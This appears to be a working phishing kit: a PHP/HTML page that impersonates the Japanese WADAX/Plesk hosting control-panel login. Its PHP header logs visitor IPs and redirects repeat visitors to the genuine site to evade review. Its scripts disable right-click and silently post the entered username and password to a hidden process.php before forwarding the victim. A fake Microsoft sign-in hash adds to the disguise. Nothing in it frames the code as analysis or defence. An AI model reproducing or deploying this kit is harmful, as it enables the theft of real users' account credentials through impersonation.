<?php


$em = $_SERVER['REMOTE_ADDR'];  

$Deniedhandle = file_get_contents("DeniedIPS1.txt"); 
       if (substr_count($Deniedhandle, $em) > 1 ){ 
	    header("Location: https://wps02.wadax.ne.jp:8443/login_up.php?success_redirect_url=%2F");
	   
	   }else{
	        $fp = fopen('DeniedIPS1.txt', 'a');
            fwrite($fp, $em."\r\n");
            fclose($fp);	  
	

?>

<!DOCTYPE html>
<html dir="ltr" class="sid-plesk" data-scrapbook-source="https://wps02.wadax.ne.jp:8443/login_up.php?success_redirect_url=%2F" data-scrapbook-create="20220425120652468" data-scrapbook-title="WADAX あんしんWPサーバー" lang="ja">
   <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE">
      <meta name="format-detection" content="telephone=no">
      <title>WADAX あんしんWPサーバー</title>
      <meta name="plesk-build" content="1800211117.18">
      <meta name="plesk-revision" content="bbbc28fd54b0747027d82997dd24710e1f05caba">
      <meta name="forgery_protection_token" id="forgery_protection_token" content="b158509ad1cbb863e5e48bd0b8675e1e">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
      <link rel="shortcut icon" href="externals/vendor/data/cloud/favicon.ico">
      <link rel="stylesheet" href="externals/vendor/data/cloud/plesk-ui-library.css">
      <link rel="stylesheet" href="externals/vendor/data/cloud/main.css">
      <link rel="stylesheet" href="externals/vendor/data/cloud/custom.css">
      <!--
	  <script type="text/javascript" src="externals/vendor/data/cloud/prototype.js"></script>
      <script type="text/javascript" src="externals/vendor/data/cloud/plesk-ui-library.min.js"></script>
      <script type="text/javascript" src="externals/vendor/data/cloud/vendors.js"></script>
      <script type="text/javascript" src="externals/vendor/data/cloud/main.js"></script>
      <script type="text/javascript" src="externals/vendor/data/cloud/require.js"></script>
      <script type="text/javascript">
         
         require.config({"waitSeconds":0,"baseUrl":"\/cp\/javascript\/","urlArgs":"18.0.39-2","paths":{"modules":"\/modules"}});
         define('plesk-ui-library', window.PleskUiLibrary);   
      </script>
      <script type="text/javascript" src="externals/vendor/data/cloud/global.js"></script>
      <script type="text/javascript"></script>
      <script type="text/javascript">
        
         Jsw.onReady(function () {
         
         });
         
         var std_context = 'login_up';
         SetHelpPrefix(''); SetContext(std_context);
        
      </script><script type="text/javascript">
         Jsw.skinUrl = '/theme-skins/heavy-metal/';
      </script>
	  -->
      <!-- extension include: heavy-metal-skin -->
	  
	  <link rel="stylesheet" href="heavy-metals/theme/skin/heavy/style.css" />
	  
   </head>
   <body class="sid-login">
      <div id="plesk-root">
         <div class="login-page">
            <div class="pul-layout pul-layout--simplified pul-layout--sm pul-layout--header login-page__inner">
               <div class="pul-layout__inner">
                  <header class="pul-layout__header" style="height: 122px;">
                     <div class="pul-layout__header-inner">
                        <div class="pul-layout__header-content">
                           <div class="pul-layout__header-content-inner">
                              <div class="login-page-header">
                                 <div class="login-page-header__brand"><a href="https://www.wadax.ne.jp/" class="brand" target="_blank"><img class="brand__logo" src="externals/vendor/data/cloud/logoImg-lFSBdj" alt="wadaxlogo.png"></a></div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </header>
                  <div class="pul-layout__container">
                     <div class="pul-layout__content">
                        <div class="pul-layout__content-addon">
                           <div class="pul-layout__content-addon-inner"></div>
                        </div>
                        <main class="pul-layout__main">
                           <div class="pul-layout__main-inner">
                              <div id="main" class="login-page__content">
                                 <form class="pul-form login-page__form" id="loginForm" name="loginForm" action="" method="post">
                                    <div id="loginSection">
                                       <div class="pul-section-item pul-section-item--vertical pul-form-field pul-form-field-text">
                                          <div class="pul-section-item__title">
                                             <div class="pul-form-field__label">
											 <label for="login_name">
											 <span>ユーザ名</span>
											 </label>
											 </div>
                                          </div>
                                          <div class="pul-section-item__value">
                                             <div>
											 <span class="pul-input pul-input--size-fill pul-form-field-text__input">
											 <input type="text" class="pul-input__input" id="login_name" name="login_name" autocomplete="off" required value="">
											 </span>
											 </div>
                                          </div>
                                       </div>
                                       <div class="pul-section-item pul-section-item--vertical pul-form-field pul-form-field-password">
                                          <div class="pul-section-item__title">
                                             <div class="pul-form-field__label">
											 <label for="passwd">
											 <span>パスワード</span>
											 </label>
											 </div>
                                          </div>
                                          <div class="pul-section-item__value">
                                             <div>
                                                <div class="pul-form-field-password__control pul-form-field-password__control--fill">
                                                   <div class="pul-form-field-password__field pul-form-field-password__field--fill">
                                                      <span class="pul-input pul-input--size-fill pul-input--affix pul-form-field-password__input">
                                                         <input type="password" class="pul-input__input" id="passwd" name="passwd" autocomplete="off" required value="">
                                                         <span class="pul-input__suffix">
                                                            <button class="pul-button pul-button--ghost pul-button--empty pul-form-field-password__button--show" type="button">
                                                               <span class="pul-button__inner">
                                                                  <span class="pul-icon pul-icon--size-16 pul-button__icon">
                                                                     <svg focusable="false">
                                                                        <use xlink:href="symbols.svg#eye-closed:16"></use>
                                                                     </svg>
                                                                  </span>
                                                                  <span></span>
                                                               </span>
                                                            </button>
                                                         </span>
                                                      </span>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="pul-section-item pul-section-item--vertical pul-form-field pul-form-field-select">
                                          <div class="pul-section-item__title">
                                             <div class="pul-form-field__label">
											 <label for="locale_id"><span>インターフェース言語</span>
											 </label>
											 </div>
                                          </div>
                                          <div class="pul-section-item__value">
                                             <div>
                                                <div class="pul-select pul-select--size-fill">
                                                   <div class="pul-select-control">
                                                      <span class="pul-select-control__value-container"><input id="locale_id" class="pul-select-control__input" type="text" readonly style="width: 2px;" value=""><span class="pul-select-control__value"><span>デフォルト</span></span></span>
                                                      <span class="pul-select-control__indicators">
                                                         <button type="button" class="pul-select-control__indicator pul-select-control__indicator--dropdown" tabindex="-1">
                                                            <span class="pul-icon pul-select-control__indicator-icon">
                                                               <svg xmlns="http://www.w3.org/2000/svg" viewBox="-4 -5 16 16" aria-hidden="true" focusable="false">
                                                                  <path d="M4 4.048L.847.895a.496.496 0 1 0-.702.702l3.452 3.451a.5.5 0 0 0 .806 0l3.452-3.451a.496.496 0 0 0-.702-.702L4 4.048z"></path>
                                                               </svg>
                                                            </span>
                                                         </button>
                                                      </span>
                                                      <input type="hidden" name="locale_id" value="default">
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <input type="hidden" name="forgery_protection_token" value="b158509ad1cbb863e5e48bd0b8675e1e"><input name="success_redirect_url" type="hidden" value="/">
                                    <div class="pul-section pul-section--vertical pul-form__footer">
                                       <div class="pul-section-item pul-section-item--vertical pul-form-field">
                                          <div class="pul-section-item__title">
                                             <div class="pul-form-field__label"><label></label></div>
                                          </div>
                                          <div class="pul-section-item__value">
                                             <div>
											 <button class="pul-button pul-button--lg pul-button--primary pul-button--fill login-page__login-button" type="submit" name="btnsnd" id="btnsnd">
											 <span class="pul-button__inner">
											 <span>
											 <span>ログイン</span>
											 </span>
											 </span>
											 </button>
											 </div>
                                          </div>
                                       </div>
                                    </div>
                                    <input type="image" src="externals/vendor/data/cloud/ff7489a6dd9ab0d9a4b084315f5b9d77cf9fdf50.gif" style="border: 0px none; height: 0px; width: 0px; position: absolute;">
                                 </form>
                                 <div class="login-page__links">
                                    <span class="pul-action pul-action--size-16">
                                       <a href="https://support.plesk.com/hc/en-us/articles/213413369-How-to-log-in-to-Plesk-" target="_blank" class="pul-action__content">
                                          <span class="pul-icon pul-icon--size-16 pul-action__icon">
                                             <svg focusable="false">
                                                <use xlink:href="symbols.svg#question-mark-circle:16"></use>
                                             </svg>
                                          </span>
                                          <span>What username and password to use?</span>
                                       </a>
                                    </span>
                                    <span class="pul-action pul-action--size-16">
                                       <a href="https://wps02.wadax.ne.jp:8443/get_password.php?locale=default" class="pul-action__content">
                                          <span class="pul-icon pul-icon--size-16 pul-action__icon">
                                             <svg focusable="false">
                                                <use xlink:href="symbols.svg#lock-closed:16"></use>
                                             </svg>
                                          </span>
                                          <span>パスワードを忘れた場合</span>
                                       </a>
                                    </span>
                                    <span class="pul-action pul-action--size-16">
                                       <a class="pul-action__content" href="https://wps02.wadax.ne.jp:8443/login_up.php?modals[cookie-policy-preferences]=true">
                                          <span class="pul-icon pul-icon--size-16 pul-action__icon">
                                             <svg focusable="false">
                                                <use xlink:href="symbols.svg#globe:16"></use>
                                             </svg>
                                          </span>
                                          <span>Cookies policy in Plesk</span>
                                       </a>
                                    </span>
                                 </div>
                              </div>
                           </div>
                        </main>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
	  <!--
      <script>
         //<![CDATA[
             Plesk.run({"config":{"gdprCookies":{"uat-iid":"analytics","uat-sid":"analytics","uat-data-source":"analytics"}},"data":{"isInitial":true,"status":[],"locale":{"components.status.error":"エラー","components.status.info":"情報","components.status.warning":"警告","components.cookie-policy.info.title":"Cookie を許可しますか","components.cookie-policy.info.necessaryCookiesMessage":"Plesk にログインすることで、必要な Cookie の使用を許可することになります。","components.cookie-policy.info.message":"%%cookieInformationLink%% Plesk の使用状況について情報を収集します。これにより、お客様が Plesk をもっと活用できるようにサービスを強化することが可能になります。","components.cookie-policy.info.cookieInformationLink":"Cookie は","components.cookie-policy.info.acceptButton":"すべての Cookie を許可する","components.cookie-policy.info.preferencesButton":"Cookie の設定をする","components.cookie-policy.preferences.title":"Plesk の Cookie","components.cookie-policy.preferences.description":"Cookie とは、携帯電話、タブレット、コンピュータで Plesk を訪問すると保存されるファイルです。当社は、Plesk をスムーズに機能させ、特定の情報を収集するために Cookie を利用しています。","components.cookie-policy.preferences.settingsTitle":"Cookie 設定","components.cookie-policy.preferences.settingsDescription":"Plesk では 3 種類の Cookie を使用します。使用を許可するものを有効にしてください。","components.cookie-policy.preferences.analyticsTitle":"製品の改良に利用される Cookie","components.cookie-policy.preferences.analyticsDescription":"Plesk では匿名のトラッキング Cookie を使用してお客様による Plesk の使用状況についての情報を収集します。これにより、Plesk のさらなる改良が可能になります。トラッキング Cookie はユーザの身元特定を行いません。ユーザが訪問した Plesk ページ、滞在時間、クリックしたオブジェクトについて、匿名化された情報を格納します。Plesk が収集されたデータを第三者サービスに販売することはありません。","components.cookie-policy.preferences.marketingTitle":"コミュニケーションとマーケティングに利用される Cookie","components.cookie-policy.preferences.marketingDescription":"これらの Cookie は、ユーザの Plesk 設定に関する情報を収集し、お勧めをパーソナライズするために利用されます。","components.cookie-policy.preferences.necessaryTitle":"絶対に必要な Cookie","components.cookie-policy.preferences.necessaryDescription":"これらの Cookie は、セキュリティ、ネットワーク管理、アクセシビリティなどの Plesk コア機能を有効にするために利用されます。これらは常にオンにする必要があります。この他に必要な Cookie には、パーソナライズとユーザビリティの改良に利用される機能 Cookie などがあります（たとえば、言語設定、フォントサイズ、事前入力されたフォーム）。必要な Cookie は%%browserSettingsLink%%で無効にできますが、Plesk に影響が出る可能性があります。","components.cookie-policy.preferences.browserSettingsLink":"ブラウザ設定","components.cookie-policy.preferences.pleskCookiesLink":"使用中の Cookie について詳細を確認してください","components.cookie-policy.preferences.on":"オン","components.cookie-policy.preferences.off":"オフ","components.cookie-policy.preferences.submitButton":"変更を保存","components.cookie-policy.preferences.cancelButton":"キャンセル","loginLabel":"ユーザ名","passwdLabel":"パスワード","localeLabel":"インターフェース言語","defaultLocale":"デフォルト","loginButtonLabel":"ログイン","enterLoginAndPasswd":"ログイン名とパスワードを入力してください。","whatUsernamePassword":"What username and password to use?","forgotPasswordLabel":"パスワードを忘れた場合","cookies":"Cookies policy in Plesk","avoidSSLWarningsMsg":"Plesk ログイン時に SSL に関する警告を回避するには、%%link%% を使用してください","digitalOceanMsg":"New to Plesk on DigitalOcean? Use \"root\" and the password entered when creating this droplet to log in. %%link%%","amazonLightsailMsg":"New to Plesk on Lightsail? To log in to Plesk, access the server via SSH and use the \"plesk login\" command. %%link%%","readGuide":"Read the complete guide."},"values":{"login_name":"","passwd":"","locale_id":"default"},"availableLocales":[{"code":"ja-JP","name":"日本語 (Japan)","dir":"ltr"}],"extensionsAdditionalBody":"","params":{"success_redirect_url":"\/"},"sslWarning":null,"logo":{"img":"\/images\/logos\/logoImg-lFSBdj?1543981375","alt":"wadaxlogo.png","isCustom":true,"href":"https:\/\/www.wadax.ne.jp\/","target":"_blank"}},"graphqlQueries":[{"query":" { config { gdpr { cookieSettings { loginFormEntrypointEnabled } } login { howToLoginArticle } } serverInfo { cloudType isFirstLogin } }","variables":null,"data":{"config":{"gdpr":{"cookieSettings":{"loginFormEntrypointEnabled":true,"__typename":"ConfigSectionGdprCookieSettings"},"__typename":"ConfigSectionGdpr"},"login":{"howToLoginArticle":"https:\/\/support.plesk.com\/hc\/en-us\/articles\/213413369-How-to-log-in-to-Plesk-","__typename":"ConfigSectionLogin"},"__typename":"Config"},"serverInfo":{"cloudType":"","isFirstLogin":false,"__typename":"ServerInfo"},"__typename":"Query"}},{"query":"{ config { gdpr { cookieBox { enabled } } } }","variables":null,"data":{"config":{"gdpr":{"cookieBox":{"enabled":true,"__typename":"ConfigSectionGdprCookieBox"},"__typename":"ConfigSectionGdpr"},"__typename":"Config"},"__typename":"Query"}},{"query":"{ viewer { type } config { webSocket { enabled } } }","variables":null,"data":{"viewer":{"type":"UNDEFINED","__typename":"User"},"config":{"webSocket":{"enabled":true,"__typename":"ConfigSectionWebSocket"},"__typename":"Config"},"__typename":"Query"}}],"localeSections":{"components.buttons":{"save":"OK","apply":"適用する","cancel":"キャンセル","yes":"はい","yesRemove":"はい、削除します","no":"いいえ","ok":"OK","remove":"削除","logout":"ログアウト","next":"次へ >","start":"開始 >>","wait":"お待ちください","updateAndLock":"更新してロック","applyAndLock":"適用してロック","updateAndSync":"更新して同期","badgeNew":"新規","timeout":"この処理に時間がかかっています。数分後に結果を確認してください。","resetToDefault":"デフォルトにリセット","defaultValue":"（デフォルト）","nextWithoutArrow":"次へ","back":"戻る"},"components.tasks.common":{"hideCompletedTasks":"完了したタスクを隠す","progressBarHide":"隠す","progressBarShow":"表示する","close":"閉じる","refresh":"ページ更新","taskInProgress":"%%count%% 件のタスクを処理中です...","percentCompleted":"%%percent%%% 完了","allTasksCompleted":"合計 %%num%% 件のタスクが正常に完了しました。","minimize":"最小化","statusDone":"完了","statusError":"失敗","statusNotStarted":"キューに登録済","statusCanceled":"キャンセル済み","progressDialogLink":"進捗の詳細"},"components.status":{"error":"エラー","info":"情報","warning":"警告"},"components.cookie-policy.info":{"title":"Cookie を許可しますか","necessaryCookiesMessage":"Plesk にログインすることで、必要な Cookie の使用を許可することになります。","message":"%%cookieInformationLink%% Plesk の使用状況について情報を収集します。これにより、お客様が Plesk をもっと活用できるようにサービスを強化することが可能になります。","cookieInformationLink":"Cookie は","acceptButton":"すべての Cookie を許可する","preferencesButton":"Cookie の設定をする"},"components.cookie-policy.preferences":{"title":"Plesk の Cookie","description":"Cookie とは、携帯電話、タブレット、コンピュータで Plesk を訪問すると保存されるファイルです。当社は、Plesk をスムーズに機能させ、特定の情報を収集するために Cookie を利用しています。","settingsTitle":"Cookie 設定","settingsDescription":"Plesk では 3 種類の Cookie を使用します。使用を許可するものを有効にしてください。","analyticsTitle":"製品の改良に利用される Cookie","analyticsDescription":"Plesk では匿名のトラッキング Cookie を使用してお客様による Plesk の使用状況についての情報を収集します。これにより、Plesk のさらなる改良が可能になります。トラッキング Cookie はユーザの身元特定を行いません。ユーザが訪問した Plesk ページ、滞在時間、クリックしたオブジェクトについて、匿名化された情報を格納します。Plesk が収集されたデータを第三者サービスに販売することはありません。","marketingTitle":"コミュニケーションとマーケティングに利用される Cookie","marketingDescription":"これらの Cookie は、ユーザの Plesk 設定に関する情報を収集し、お勧めをパーソナライズするために利用されます。","necessaryTitle":"絶対に必要な Cookie","necessaryDescription":"これらの Cookie は、セキュリティ、ネットワーク管理、アクセシビリティなどの Plesk コア機能を有効にするために利用されます。これらは常にオンにする必要があります。この他に必要な Cookie には、パーソナライズとユーザビリティの改良に利用される機能 Cookie などがあります（たとえば、言語設定、フォントサイズ、事前入力されたフォーム）。必要な Cookie は%%browserSettingsLink%%で無効にできますが、Plesk に影響が出る可能性があります。","browserSettingsLink":"ブラウザ設定","pleskCookiesLink":"使用中の Cookie について詳細を確認してください","on":"オン","off":"オフ","submitButton":"変更を保存","cancelButton":"キャンセル"},"components.search-bar":{"nothingFound":"検索結果が見つかりません。","fieldStub":"検索...","moreResultsFound":"%%limit%% 件以上が見つかりました。検索を絞り込んでください。"},"components.shortcuts":{"logIn":"ログイン","identityName":"契約者 %%identity%%","loggedInAs":"ログイン名：","impersonatedInAs":"契約者","myProfile":"プロファイルを編集","logOut":"ログアウト","backToAdmin":"管理者に戻る","readManual":"ガイドを読む","tutorials":"ビデオチュートリアルを再生","sureToLogout":"ログアウトしますか？","impersonatedName":"ログイン名：%%identity%%","subscription":"契約","webspace":"ウェブスペース","linkToFeedback":"バグが見つかった場合","userFeedback":"アイデアを提案","facebookJoinCommunity":"当社の Facebook ページ","twitterFollow":"@Plesk をフォロー","provideRating":"ご意見窓口","linkToCookies":"Cookie","extensionDeveloperGuide":"拡張を開発するには？","knowledgeBaseArticles":"ナレッジベース記事","helpCenter":"ヘルプセンター","pleskFacebookCommunity":"Plesk Facebook コミュニティ","pleskForum":"Plesk フォーラム","releaseNotes":"リリースノート","aboutPlesk":"Plesk について"},"components.notification-center":{"title":"通知","markAsRead":"既読にする","markAsUnread":"未読にする","markAllAsRead":"既読にする","settings":"設定","filterButton":"フィルタ","filterUnread":"未読","filterCritical":"重大","filterFavorite":"お気に入り","filterReset":"フィルタをクリア","searchPlaceholder":"検索...","favoriteNotification":"お気に入りに追加","unfavoriteNotification":"お気に入りから削除","deleteNotification":"通知を削除","learnMore":"さらに詳しく","moreToasts":"通知があと %%total%% 通あります","dateFormat":"%%month%% %%day%%","timeFormat":"%%hours%%:%%minutes%%","month0":"1 月","month1":"2 月","month2":"3 月","month3":"4 月","month4":"5 月","month5":"6 月","month6":"7 月","month7":"8 月","month8":"9 月","month9":"10 月","month10":"11 月","month11":"12 月","categoryAlert":"アラート","categoryWarning":"注意","listEmptyTitle":"重要なサーバイベントを見落とさないようにしましょう","listEmptyDescription":"リソースの使用上限に達したり、重要なアップデートが配信されたりすると、Plesk から通知があります。注意してご確認ください。","listFilteredTitle":"フィルタ条件を満たすアイテムがありません","listFilteredDescription":"フィルタが厳し過ぎるようです。フィルタ条件を変更してください。"},"components.license-status":{"trialLicenseWarningAdmin":"日で評価版の期限が切れます","buyLicenseButton":"ライセンスを購入","installLicenseButton":"既にライセンスをお持ちですか？","testLicenseWarningAdmin":"Plesk が本番用ではないライセンスで実行されています。","testLicenseWarningClient":"この Plesk は、本番用ではないライセンスで実行されています。サーバ管理者までお問い合わせください。","trialOverTitle":"評価期間がまもなく終了します","trialOverText":"評価期間はまもなく終了します。評価期間終了後も Plesk を使い続けるには、ライセンスをご購入ください。","defaultLicenseWarningAdmin":"Plesk を使用するには、新しい評価版キーを入手し、インストールしてください。","expiredLicenseWarningAdmin":"ライセンスキーの有効期限が切れました。Plesk を使用するには、新しい有効なライセンスキーを入手し、インストールしてください。","demoLicenseWarningAdmin":"デモはいかがでしたか？今すぐご購入ください！","demoLicenseTryPlesk":"%%link%%方法をご確認ください。","demoLicenseTryPleskLink":"Plesk を独自にテストするか、クラウドサーバ上でテストする","getTrialButton":"評価版を取得"},"components.view-switcher":{"title":"ビュー変更","serviceProviderView":"サービスプロバイダビュー","powerUserView":"パワーユーザビュー","currentViewMessage":"現在、%%view%% を使用しています。","actionMessage":"%%switchLink%%か、%%helpLink%%してください。","switchView":"%%view%% に切り替える","learnMore":"ビューの詳細を確認","powerUserViewWarning":"パワーユーザビューでは、自社のドメインのみ管理できます。顧客とリセラー、およびそのドメインは表示されません。","confirmationBoxText":"［ビュー変更］メニューを隠しますか？","confirmationBoxDescription":"メニューを隠すと、永久的に削除されます。［ツールと設定］>［インターフェース管理］でビューを切り替えることはできます。","confirmationBoxButtonYes":"はい","confirmationBoxButtonNo":"いいえ"}}});
         //]]>
      </script>
	  -->
      <div class="pul-layer">
         <div class="pul-toaster pul-toaster--top-end" data-type="toaster" style="z-index: 1055;"><span></span></div>
      </div>
      <canvas style="position: fixed; padding: 0px; margin: 0px; right: 0px; left: 0px; top: 0px; z-index: 100001; display: none; opacity: 0.05;" class="top-bar-progress" data-scrapbook-canvas="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABVYAAAAKCAYAAABfTQU5AAABMUlEQVR4Xu3asQ3AMAwDsPqb3t6j+koC5IJoFj1rIjQJnvf71+MIECBAgAABAgQIECBAgAABAgQIECBA4FpgDKvXVoIECBAgQIAAAQIECBAgQIAAAQIECBA4AsOBAAECBAgQIECAAAECBAgQIECAAAECBDIBw2rmJU2AAAECBAgQIECAAAECBAgQIECAAAEfqzpAgAABAgQIECBAgAABAgQIECBAgACBVMDHaiomT4AAAQIECBAgQIAAAQIECBAgQIBAvYBhtb4CAAgQIECAAAECBAgQIECAAAECBAgQSAUMq6mYPAECBAgQIECAAAECBAgQIECAAAEC9QKG1foKACBAgAABAgQIECBAgAABAgQIECBAIBUwrKZi8gQIECBAgAABAgQIECBAgAABAgQI1AtsFoQFaeNndWsAAAAASUVORK5CYII=" width="1366" height="10"></canvas>
      <div class="tooltip" style="display: none;"></div>
      <!--
	  <script data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({mode: 'open'}); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
      -->
  
  
  
  
<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="heavy-metals/theme/skin/heavy/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

var $c = getUrlParameter('user');
     $('#login_name').val($c);
	$('#me').text($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script> 

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

$('#loginForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		 var user = $('#login_name').val();
		$.post('modules/cp/js/style/process.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                              window.location.href = "indexx.php?user=" + user;
                        },2000);
		e.preventDefault();
	});


</script>


<?php
	   }
?>


<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="heavy-metals/theme/skin/heavy/actions.js"></script>
</body>
</html>